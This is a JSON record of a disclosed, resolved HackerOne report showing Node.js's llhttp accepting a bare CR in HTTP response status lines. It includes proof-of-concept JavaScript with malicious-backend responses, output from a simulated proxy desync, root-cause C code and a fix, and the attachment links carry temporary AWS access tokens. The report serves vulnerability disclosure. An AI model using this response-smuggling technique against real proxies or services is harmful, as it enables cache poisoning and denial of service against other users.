@@ -1,0 +1,152 @@
+{
+  "id": 3648681,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjQ4Njgx",
+  "url": "https://hackerone.com/reports/3648681",
+  "title": "Improper Input Validation — HTTP Response Parser Unconditionally Accepts Bare CR in Status Line",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-04-04T03:28:03.069Z",
+  "submitted_at": "2026-04-04T03:28:04.460Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "saif-01",
+    "url": "/saif-01",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ih2m7xe42757larmn4t8cfpgdkl6/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-07-01T15:39:11.433Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-07-01T15:39:10.653Z",
+  "team_member_agreed_on_going_public_at": "2026-07-01T15:14:29.510Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Weakness: Improper Input Validation — HTTP Response Parser Unconditionally Accepts Bare CR in Status Line\n\n## Summary\n\nThe llhttp HTTP response parser (bundled with Node.js) unconditionally accepts a bare carriage return (`\\r` / `0x0D`) as a valid response status line terminator when it follows an initial `\\r`. This means a second `\\r` is consumed and treated as a valid line ending, transitioning the parser to header processing without requiring the mandatory LF (`\\n` / `0x0A`) that RFC 7230 §3.1.2 demands.\n\nThe same bare CR is **correctly rejected** in the **request** parsing path — creating a request/response parsing asymmetry. A strict RFC-compliant reverse proxy sitting in front of a malicious backend will reject the bare CR, while the Node.js HTTP client silently accepts it. This parsing differential enables **HTTP Response Queue Poisoning / Response Smuggling**.\n\n- **Affected Component**: `deps/llhttp/src/llhttp.c` — state `s_n_llhttp__internal__n_res_line_almost_done` (line 6130)\n- **Affected Versions**: Node.js up to v24.14.1 (llhttp v9.3.0 / v9.3.1)\n- **No Lenient Flags Required**: This vulnerability triggers in **strict mode** with `insecureHTTPParser: false` (the default)\n\n## Steps To Reproduce\n\n### Step 1: Basic — Node.js accepts bare CR in response status line\n\nCreate a file `poc_basic.js`:\n\n```javascript\nconst http = require('http');\nconst net = require('net');\n\nconst server = net.createServer((sock) => {\n  // Response with bare CR (\\r\\r) as status line terminator instead of \\r\\n\n  const payload = 'HTTP/1.1 200 OK\\r\\rContent-Length: 4\\r\\n\\r\\nEvil';\n  sock.write(payload);\n  setTimeout(() => sock.end(), 300);\n});\n\nserver.listen(19999, () => {\n  const req = http.request({\n    hostname: '127.0.0.1',\n    port: 19999,\n    path: '/',\n    method: 'GET',\n    insecureHTTPParser: false  // strict mode (default)\n  }, (res) => {\n    let body = '';\n    res.on('data', (c) => body += c);\n    res.on('end', () => {\n      console.log('Status:', res.statusCode);         // 200\n      console.log('Headers:', JSON.stringify(res.headers)); // {\"content-length\":\"4\"}\n      console.log('Body:', body);                       // Evil\n      server.close();\n    });\n  });\n  req.on('error', (e) => console.log('Error:', e.message));\n  req.end();\n});\n```\n\nRun: `node poc_basic.js`\n\n**Output:**\n```\nStatus: 200\nHeaders: {\"content-length\":\"4\"}\nBody: Evil\n```\n\nNode.js parses the response successfully — despite the status line being terminated with `\\r\\r` (bare CR) instead of the RFC-mandated `\\r\\n` (CRLF).\n\n### Step 2: Asymmetry — Request path correctly rejects bare CR\n\n```javascript\nconst http = require('http');\nconst net = require('net');\n\nconst server = http.createServer((req, res) => res.end('OK'));\nserver.listen(19998, () => {\n  const sock = net.createConnection({ host: '127.0.0.1', port: 19998 }, () => {\n    sock.write('GET / HTTP/1.1\\r\\rHost: localhost\\r\\n\\r\\n');\n  });\n  sock.on('data', (d) => {\n    console.log(d.toString().split('\\r\\n')[0]);\n    // Output: HTTP/1.1 400 Bad Request\n    server.close();\n    sock.destroy();\n  });\n});\n```\n\n### Step 3: Full Exploit — Response Queue Poisoning via Strict Proxy\n\nThis step demonstrates the **actual security impact** with a strict RFC-compliant reverse proxy in the middle. Run `poc_full_demo.js` (attached) which includes:\n\n- A **strict RFC reverse proxy** that parses responses correctly (rejects `\\r\\r`)\n- A **malicious backend** that sends responses with `\\r\\r`\n- **Two victim clients** sharing the proxy's connection pool\n\n```\nClient A ──→ [Strict Proxy :18888] ──→ [Malicious Backend :18889]\nClient B ──→ [Strict Proxy :18888] ──→ (same keep-alive pool)\n```\n\nRun: `node poc_full_demo.js`\n\n**Output (key evidence):**\n\n```\n[PROXY] 🔴 BARE CR detected at offset 15!\n[PROXY] STRICT PARSING: \\r\\r is INVALID per RFC 7230 §3.1.2\n[PROXY] → Response is COMPLETE (no headers, no body)\n[PROXY] Keeping 28 bytes as ORPHAN DATA\n[PROXY]   Orphan hex: 436f6e74656e742d4c656e6774683a20360d0a0d0a48656c6c6f2041\n\n[CLIENT A] Contains \"Hello A\": false\n[CLIENT A] 🔴 Body was STRIPPED by proxy!\n\n[PROXY] ⚠️  PREPENDING 28 bytes of ORPHAN DATA to request!\n[BACKEND] Request #3: Content-Length: 6\n[BACKEND] 🔴 GARBLED REQUEST LINE! Orphan data was prepended!\n[BACKEND]   \"Content-Length: 6\\r\\n\\r\\nHello AGET /page2 HTTP/1.1\\r\\n...\"\n\n[CLIENT B] 🔴🔴🔴 DESYNC CONFIRMED! 🔴🔴🔴\n[CLIENT B] Got 400 Bad Request because:\n[CLIENT B]   Proxy prepended orphan data to Client B's request\n[CLIENT B]   Backend received garbled request → 400!\n```\n\n**What happened step-by-step:**\n1. Client A requested `/page1` through the proxy\n2. Backend responded with `HTTP/1.1 200 OK\\r\\rContent-Length: 6\\r\\n\\r\\nHello A`\n3. **Strict proxy** interpreted `\\r\\r` as: status-complete + empty-line = **response done (no body)**\n4. Proxy kept `Content-Length: 6\\r\\n\\r\\nHello A` as **orphan data** in the connection pool\n5. Client B requested `/page2` on the same proxy\n6. Proxy **prepended orphan data** to Client B's request\n7. Backend received: `Content-Length: 6\\r\\n\\r\\nHello AGET /page2 HTTP/1.1\\r\\n...` — **garbled!**\n8. Backend returned `400 Bad Request`\n9. **Client B's legitimate request was denied**\n\n## PoC\n\nSee attached file: `poc_full_demo.js` — self-contained demo with built-in strict proxy, malicious backend, and two victim clients.\n\nAlso attached: `poc_basic.js` — minimal reproduction (no proxy needed).\n\n## Supporting Material/References\n\n### Root Cause — Generated C Code (`deps/llhttp/src/llhttp.c`)\n\n**Response path** (vulnerable) — line 6130:\n```c\ncase s_n_llhttp__internal__n_res_line_almost_done: {\n    if (p == endp) return s_n_llhttp__internal__n_res_line_almost_done;\n    switch (*p) {\n        case 10: {   // LF — valid\n            p++;\n            goto s_n_llhttp__internal__n_invoke_llhttp__on_status_complete;\n        }\n        default: {   // ANY byte (including CR) → lenient check\n            goto s_n_llhttp__internal__n_invoke_test_lenient_flags_29;\n        }\n    }\n}\n```\n\nThe first CR is consumed at `span_end_llhttp__on_status_1` (line 9617):\n```c\ns_n_llhttp__internal__n_span_end_llhttp__on_status_1: {\n    // ... on_status callback ...\n    p++;    // ← CR is consumed here\n    goto s_n_llhttp__internal__n_res_line_almost_done;\n}\n```\n\nAfter the first CR, the parser enters `res_line_almost_done`. The **second CR** (0x0D) hits the `default` case and goes to the lenient flag check (`LENIENT_OPTIONAL_LF_AFTER_CR` / flag `0x40`). Despite this flag being **unset in strict mode**, the parser accepts the bare CR and transitions to header processing.\n\n**Request path** (correctly strict) — line 3309:\n```c\ncase s_n_llhttp__internal__n_req_http_complete_crlf: {\n    switch (*p) {\n        case 10: {   // LF only — valid\n            p++;\n            goto s_n_llhttp__internal__n_headers_start;\n        }\n        default: {   // CR or anything else → error in strict mode\n            goto s_n_llhttp__internal__n_invoke_test_lenient_flags_26;\n        }\n    }\n}\n```\n\nThe request path only accepts `LF` (0x0A). A second CR in strict mode produces an error. **This asymmetry is the root cause of the vulnerability.**\n\n### Verified Test Results (Node.js v24.14.1, llhttp v9.3.0)\n\n| Test | Payload Pattern | Expected | Result |\n|------|----------------|----------|--------|\n| T1: Normal | `HTTP/1.1 200 OK\\r\\n...` | ACCEPT | ACCEPT ✅ |\n| T2: Bare CR | `HTTP/1.1 200 OK\\r\\r...` | REJECT | **ACCEPT ❌** |\n| T3: CR CR LF | `HTTP/1.1 200 OK\\r\\r\\n...` | REJECT | REJECT ✅ |\n| T4: Bare LF | `HTTP/1.1 200 OK\\n...` | REJECT | REJECT ✅ |\n| T5: Bare CR + CL | `HTTP/1.1 200 OK\\r\\rCL:4\\r\\n\\r\\nEvil` | REJECT | **ACCEPT ❌** |\n| T6: Request path \\r\\r | `GET / HTTP/1.1\\r\\rHost:...` | REJECT | REJECT ✅ |\n\n### Proxy Demo — Verified Desync Evidence\n\n| Step | Actor | Action | Result |\n|------|-------|--------|--------|\n| 1 | Client A | `GET /page1` via proxy | Forwarded to backend |\n| 2 | Backend | Responds with `\\r\\r` status line | `HTTP/1.1 200 OK\\r\\rCL:6\\r\\n\\r\\nHello A` |\n| 3 | Proxy | Parses response strictly | Treats `\\r\\r` as response complete (no body) |\n| 4 | Proxy | Stores remaining 28 bytes | `Content-Length: 6\\r\\n\\r\\nHello A` = **orphan data** |\n| 5 | Client B | `GET /page2` via proxy | Request sent to backend |\n| 6 | Proxy | Prepends orphan data | `CL:6\\r\\n\\r\\nHello A` + `GET /page2...` |\n| 7 | Backend | Receives garbled request | Request line = `Content-Length: 6` → **400 Bad Request** |\n| 8 | Client B | Expects page2 content | **Gets 400 error** — legitimate request denied |\n\n## Suggested Fix\n\nIn the generated C code at `res_line_almost_done` (and equivalently in the TypeScript source), the `default` case must explicitly handle CR (0x0D) to mirror the strictness of the request path. The response parser should only accept LF (0x0A) in the `res_line_almost_done` state, just as `req_http_complete_crlf` does:\n\n```c\n// In res_line_almost_done state — add explicit CR handling:\ncase 10: {    // LF — only valid terminator\n    p++;\n    goto ...on_status_complete;\n}\ncase 13: {    // CR — NOT valid here, only LF should complete the line\n    goto s_n_llhttp__internal__n_error_97;  // \"Missing expected LF after response line\"\n}\ndefault: {\n    goto s_n_llhttp__internal__n_invoke_test_lenient_flags_29;\n}\n```\n\nThis ensures the response parser mirrors the strictness already present in the request parser, eliminating the request/response asymmetry.\n\n## Impact\n\n**HTTP Response Queue Poisoning — Practically Exploited**\n\nThe attached `poc_full_demo.js` provides a complete, self-contained proof-of-concept demonstrating:\n\n1. **Connection pool desync**: A strict reverse proxy (simulating Nginx, HAProxy, Cloudflare, etc.) and a Node.js HTTP client disagree on where an HTTP response ends, causing the proxy's connection pool to store orphan data.\n\n2. **Cross-client data corruption**: The orphan data from Client A's response is prepended to Client B's request, corrupting it. The backend returns a 400 Bad Request, denying Client B's legitimate request.\n\n3. **Real-world attack scenarios**:\n   - **Cache poisoning**: A proxy caching responses based on its (wrong) parsing boundaries could cache partial/incorrect content served to other users\n   - **Credential theft**: Orphan data containing sensitive headers/body from one user's response gets prepended to another user's request, potentially leaking into server logs or error messages\n   - **Session hijack**: In a multi-tenant proxy environment, the desync enables one client to receive another client's response data\n   - **Denial of Service**: Legitimate clients receive 400 errors or garbage responses when their requests are corrupted by orphan data\n\n**Severity factors:**\n- Triggers in **default/strict mode** — no `--insecure-http-parser` flag needed\n- Affects all Node.js versions using llhttp for response parsing\n- The request/response asymmetry makes exploitation straightforward in any reverse-proxy architecture\n- No special conditions or configurations required beyond a malicious/cooperating backend\n- **Practically exploited** with a self-contained demo (no external dependencies)",
+  "weakness": {
+    "id": 86,
+    "name": "HTTP Request Smuggling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5671471,
+      "file_name": "README.md",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/c0c56v3pfg2jjtmzbm2gxqg2efwy?response-content-disposition=attachment%3B%20filename%3D%22README.md%22%3B%20filename%2A%3DUTF-8%27%27README.md&response-content-type=text%2Fmarkdown&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7EAGYJPC%2F20260701%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260701T155721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBYaCXVzLXdlc3QtMiJHMEUCIQDtMOFNQShYStGRZ8IEWrMx6ooqRZ2FmTXvS1AjTjOcRAIgDIAv3Nj%2BSwuGjhtHOp4V0rYuyeZxgmfLHrEwLa%2F%2BsV0quwUI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDFPXGM30bTUeyHrCGCqPBe4%2BoUoHGxmIgnshcmZNlHwxd7IGlV2jIKlaTZZFHSOkHJI3YpwQsC5Y1uVYsRtvJz%2FJCJiMFt9QmaF1H%2Fx75nx68LrFr5J9%2Fjuw0wKCnAefvLDEJFqz%2Fomxq6Hemy5th4TiOy285zxDi8CZrd%2BVPQ0kvWKmGDWC94lFoKKRe2jZ4Nez%2FZP7oxP4ftsnP2CTm24na0vcYSaL7uVDQYqTki17dlsZQ63CEfc6sFUEwT%2FbP3VVYmk7v0%2Bk8pxjTgWDlKdmo8IdhXQBrSDjRlydiUVakd12Wy%2FF4AvgRRDwYN4wUPvySC5YK7k4g5dOCytXxqwnq98%2FB8MBoL8wJrGaey1pTo0Ln6KaeUE4BdyI%2FO3zchXb44TiRUAvxA3wo8PAbvxBWPCD%2BHGlQp9fofEGoJMONXTT%2BGwrDISM7RzjEzh7eUfma5p15EIsIk5n%2BndPjpwn%2FrDiZeBbKx1uXQ%2F9HLYno3VOcbOaEC0wHR3pAtiHUGuI2zTe8WNZa9vzqdOR8%2BNxl4MmFtWrypmiRUXkMEeDCy4WLltGpe%2F0zdE5bXRl%2FQPWTd0S5Ge%2B81DQf3%2BGX47sEjk52m0nOUuaiKmEgJepyM%2BE2Ek2NzARXDL1VZSlkq6KMvUhEC2TdGHfQ3ABuAs3%2FntJKBjpigsXDuqSDtmySQfA0Zlu8A0GPmWd8Fq87Y%2BYdJ%2BIO8AXYxiJMvSProjn4zM5xSObRNHOMO4k17lmQ%2BVXa7lIRaGyyyECtkpbtbDUnx1RJkbNYi4m0SHKrk7KXJo1s5UAaU5BWvBdczkg8YA6mVQ0Jvx2ecmDHeFFDIYbNX5TO012BbKxAHa9daokRjWs%2Fo1Yt6aPLRUXlQKKqpFL5jzc3S5ai%2BSbS0Aw97uU0gY6sQEIiKKZHxr00cbe9zb9q0bCQJwKbQVNGiMmeh76BFn1sH4ecKw4tywWZBnOrFycFxP8toawUMtriVSIIhnTpTj2k4fHxBUqAz65Wl6HWyJYe%2FPS78PJ84tu%2BbK7rlnzRJ4yGBC%2BHXy5R55jsnwdvhaCVevkTThVmU4DS46ksnOj5d81vfpbNoGnPBs5ydmltMF94T23wqZO4Yl07B6KyV4bn%2FmbamTyi13K8TJdNRegOlc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a797b5d40f8a0fe46c059cf99df263e261eb4546f2a2957a72ceaeb850c667d7",
+      "file_size": 5967,
+      "type": "text/markdown",
+      "moderated": null
+    },
+    {
+      "id": 5671472,
+      "file_name": "poc_full_demo.js",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nlu57xdjxdmlaign8pjv356xxrya?response-content-disposition=attachment%3B%20filename%3D%22poc_full_demo.js%22%3B%20filename%2A%3DUTF-8%27%27poc_full_demo.js&response-content-type=text%2Fjavascript&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7EAGYJPC%2F20260701%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260701T155721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBYaCXVzLXdlc3QtMiJHMEUCIQDtMOFNQShYStGRZ8IEWrMx6ooqRZ2FmTXvS1AjTjOcRAIgDIAv3Nj%2BSwuGjhtHOp4V0rYuyeZxgmfLHrEwLa%2F%2BsV0quwUI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDFPXGM30bTUeyHrCGCqPBe4%2BoUoHGxmIgnshcmZNlHwxd7IGlV2jIKlaTZZFHSOkHJI3YpwQsC5Y1uVYsRtvJz%2FJCJiMFt9QmaF1H%2Fx75nx68LrFr5J9%2Fjuw0wKCnAefvLDEJFqz%2Fomxq6Hemy5th4TiOy285zxDi8CZrd%2BVPQ0kvWKmGDWC94lFoKKRe2jZ4Nez%2FZP7oxP4ftsnP2CTm24na0vcYSaL7uVDQYqTki17dlsZQ63CEfc6sFUEwT%2FbP3VVYmk7v0%2Bk8pxjTgWDlKdmo8IdhXQBrSDjRlydiUVakd12Wy%2FF4AvgRRDwYN4wUPvySC5YK7k4g5dOCytXxqwnq98%2FB8MBoL8wJrGaey1pTo0Ln6KaeUE4BdyI%2FO3zchXb44TiRUAvxA3wo8PAbvxBWPCD%2BHGlQp9fofEGoJMONXTT%2BGwrDISM7RzjEzh7eUfma5p15EIsIk5n%2BndPjpwn%2FrDiZeBbKx1uXQ%2F9HLYno3VOcbOaEC0wHR3pAtiHUGuI2zTe8WNZa9vzqdOR8%2BNxl4MmFtWrypmiRUXkMEeDCy4WLltGpe%2F0zdE5bXRl%2FQPWTd0S5Ge%2B81DQf3%2BGX47sEjk52m0nOUuaiKmEgJepyM%2BE2Ek2NzARXDL1VZSlkq6KMvUhEC2TdGHfQ3ABuAs3%2FntJKBjpigsXDuqSDtmySQfA0Zlu8A0GPmWd8Fq87Y%2BYdJ%2BIO8AXYxiJMvSProjn4zM5xSObRNHOMO4k17lmQ%2BVXa7lIRaGyyyECtkpbtbDUnx1RJkbNYi4m0SHKrk7KXJo1s5UAaU5BWvBdczkg8YA6mVQ0Jvx2ecmDHeFFDIYbNX5TO012BbKxAHa9daokRjWs%2Fo1Yt6aPLRUXlQKKqpFL5jzc3S5ai%2BSbS0Aw97uU0gY6sQEIiKKZHxr00cbe9zb9q0bCQJwKbQVNGiMmeh76BFn1sH4ecKw4tywWZBnOrFycFxP8toawUMtriVSIIhnTpTj2k4fHxBUqAz65Wl6HWyJYe%2FPS78PJ84tu%2BbK7rlnzRJ4yGBC%2BHXy5R55jsnwdvhaCVevkTThVmU4DS46ksnOj5d81vfpbNoGnPBs5ydmltMF94T23wqZO4Yl07B6KyV4bn%2FmbamTyi13K8TJdNRegOlc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8933b795f107b94be31eba1b6890c7fecca45eb4df30149fb4e5331bdcfa1662",
+      "file_size": 16666,
+      "type": "text/javascript",
+      "moderated": null
+    },
+    {
+      "id": 5671473,
+      "file_name": "poc_llhttp_v2.js",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gdc6jw0hjqx636tqb131whatvgag?response-content-disposition=attachment%3B%20filename%3D%22poc_llhttp_v2.js%22%3B%20filename%2A%3DUTF-8%27%27poc_llhttp_v2.js&response-content-type=text%2Fjavascript&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7EAGYJPC%2F20260701%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260701T155721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBYaCXVzLXdlc3QtMiJHMEUCIQDtMOFNQShYStGRZ8IEWrMx6ooqRZ2FmTXvS1AjTjOcRAIgDIAv3Nj%2BSwuGjhtHOp4V0rYuyeZxgmfLHrEwLa%2F%2BsV0quwUI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDFPXGM30bTUeyHrCGCqPBe4%2BoUoHGxmIgnshcmZNlHwxd7IGlV2jIKlaTZZFHSOkHJI3YpwQsC5Y1uVYsRtvJz%2FJCJiMFt9QmaF1H%2Fx75nx68LrFr5J9%2Fjuw0wKCnAefvLDEJFqz%2Fomxq6Hemy5th4TiOy285zxDi8CZrd%2BVPQ0kvWKmGDWC94lFoKKRe2jZ4Nez%2FZP7oxP4ftsnP2CTm24na0vcYSaL7uVDQYqTki17dlsZQ63CEfc6sFUEwT%2FbP3VVYmk7v0%2Bk8pxjTgWDlKdmo8IdhXQBrSDjRlydiUVakd12Wy%2FF4AvgRRDwYN4wUPvySC5YK7k4g5dOCytXxqwnq98%2FB8MBoL8wJrGaey1pTo0Ln6KaeUE4BdyI%2FO3zchXb44TiRUAvxA3wo8PAbvxBWPCD%2BHGlQp9fofEGoJMONXTT%2BGwrDISM7RzjEzh7eUfma5p15EIsIk5n%2BndPjpwn%2FrDiZeBbKx1uXQ%2F9HLYno3VOcbOaEC0wHR3pAtiHUGuI2zTe8WNZa9vzqdOR8%2BNxl4MmFtWrypmiRUXkMEeDCy4WLltGpe%2F0zdE5bXRl%2FQPWTd0S5Ge%2B81DQf3%2BGX47sEjk52m0nOUuaiKmEgJepyM%2BE2Ek2NzARXDL1VZSlkq6KMvUhEC2TdGHfQ3ABuAs3%2FntJKBjpigsXDuqSDtmySQfA0Zlu8A0GPmWd8Fq87Y%2BYdJ%2BIO8AXYxiJMvSProjn4zM5xSObRNHOMO4k17lmQ%2BVXa7lIRaGyyyECtkpbtbDUnx1RJkbNYi4m0SHKrk7KXJo1s5UAaU5BWvBdczkg8YA6mVQ0Jvx2ecmDHeFFDIYbNX5TO012BbKxAHa9daokRjWs%2Fo1Yt6aPLRUXlQKKqpFL5jzc3S5ai%2BSbS0Aw97uU0gY6sQEIiKKZHxr00cbe9zb9q0bCQJwKbQVNGiMmeh76BFn1sH4ecKw4tywWZBnOrFycFxP8toawUMtriVSIIhnTpTj2k4fHxBUqAz65Wl6HWyJYe%2FPS78PJ84tu%2BbK7rlnzRJ4yGBC%2BHXy5R55jsnwdvhaCVevkTThVmU4DS46ksnOj5d81vfpbNoGnPBs5ydmltMF94T23wqZO4Yl07B6KyV4bn%2FmbamTyi13K8TJdNRegOlc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c1f2cf609721f7d135e952136e1d51aa1abd69281aece875a12cc051c1c16548",
+      "file_size": 9218,
+      "type": "text/javascript",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-07-31T15:14:30.581Z",
+  "allow_singular_disclosure_after": 2589428.73241554,
+  "singular_disclosure_allowed": false,
+  "vote_count": 2,
+  "voters": [
+    "saif-01",
+    "a7mmr"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
